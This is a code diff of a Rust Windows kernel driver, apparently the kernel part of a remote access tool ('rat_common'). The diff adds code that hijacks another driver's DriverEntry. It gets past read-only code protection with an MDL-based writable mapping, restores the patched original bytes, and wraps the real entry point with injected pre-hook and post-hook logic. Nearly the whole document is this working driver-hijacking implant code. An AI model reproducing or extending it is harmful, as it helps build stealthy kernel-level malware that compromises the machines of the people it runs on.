@@ -4,14 +4,26 @@ extern crate alloc;
 extern crate wdk_panic;
 
 mod driver;
+mod global;
+mod handlers;
 mod logger;
 mod string;
+mod wrappers;
 
-use core::mem;
+use core::ffi::c_void;
+use core::{mem, ptr};
 
-use log::{LevelFilter, info};
+use log::LevelFilter;
 use rat_common::kernel::KernelHandoff;
 use wdk_alloc::WdkAllocator;
+use wdk_sys::_LOCK_OPERATION::IoReadAccess;
+use wdk_sys::_MEMORY_CACHING_TYPE::MmCached;
+use wdk_sys::_MM_PAGE_PRIORITY::HighPagePriority;
+use wdk_sys::_MODE::KernelMode;
+use wdk_sys::ntddk::{
+    IoAllocateMdl, IoFreeMdl, MmMapLockedPagesSpecifyCache, MmProbeAndLockPages, MmUnlockPages,
+    MmUnmapLockedPages,
+};
 use wdk_sys::{NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER};
 
 #[global_allocator]
@@ -40,41 +52,80 @@ pub unsafe extern "system" fn driver_entry(
         return STATUS_INVALID_PARAMETER;
     }
 
-    let extra = &unsafe { extra.read_unaligned() };
+    let extra = unsafe { extra.read_unaligned() };
 
     // Recover original instructions
-    // FIXME: This triggered bugcheck ATTEMPTED_WRITE_TO_READONLY_MEMORY. A proposed solution (not implemented yet) is to
-    // map the target hooked driver to our own buffer (which has RWX permissions) and call the original DriverEntry there.
-    // Not sure if that will work though, our manual PE loader hasn't been verified yet.
+    // Use an MDL to create a writable system mapping for the read-only executable memory.
     if !extra.original_driver_entry.is_null()
         && !extra.original_instructions.is_null()
         && extra.original_instructions_len > 0
     {
         unsafe {
-            extra.original_driver_entry.copy_from_nonoverlapping(
-                extra.original_instructions,
-                extra.original_instructions_len,
+            let mdl = IoAllocateMdl(
+                extra.original_driver_entry as *mut c_void,
+                extra.original_instructions_len as u32,
+                0,
+                0,
+                ptr::null_mut(),
             );
+
+            if !mdl.is_null() {
+                let kernel_mode = KernelMode as i8;
+                let high_page_priority = HighPagePriority as u32;
+
+                // Lock pages in memory.
+                MmProbeAndLockPages(mdl, kernel_mode, IoReadAccess);
+
+                // Map the locked pages to a new, writable virtual address.
+                let mapped_address = MmMapLockedPagesSpecifyCache(
+                    mdl,
+                    kernel_mode,
+                    MmCached,
+                    ptr::null_mut(),
+                    0,
+                    high_page_priority,
+                );
+
+                if !mapped_address.is_null() {
+                    // Overwrite the original function bytes safely via the mapped writable address
+                    ptr::copy_nonoverlapping(
+                        extra.original_instructions,
+                        mapped_address as *mut u8,
+                        extra.original_instructions_len,
+                    );
+
+                    MmUnmapLockedPages(mapped_address, mdl);
+                }
+
+                MmUnlockPages(mdl);
+                IoFreeMdl(mdl);
+            }
         }
     }
 
+    let registry_path_ref = match unsafe { registry_path.as_ref() } {
+        Some(s) => unsafe { string::to_utf16str(s) },
+        None => None,
+    };
+
     // Invoke our pre-hook logic
-    let _ = driver::driver_entry(
-        driver,
-        match unsafe { registry_path.as_ref() } {
-            Some(s) => unsafe { string::to_utf16str(s) },
-            None => None,
-        },
-    );
+    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref) {
+        error!("DriverEntry pre-hook failed: {e}");
+    }
 
     // Call the original DriverEntry
+    info!(
+        "Calling original DriverEntry at {:p}...",
+        extra.original_driver_entry
+    );
     let status = unsafe {
         let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.original_driver_entry);
         original_fn(driver, registry_path)
     };
 
     // Invoke our post-hook logic
-    info!("Original DriverEntry returned with status: 0x{status:X}");
-
+    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status) {
+        error!("DriverEntry post-hook failed: {e}");
+    }
     status
 }
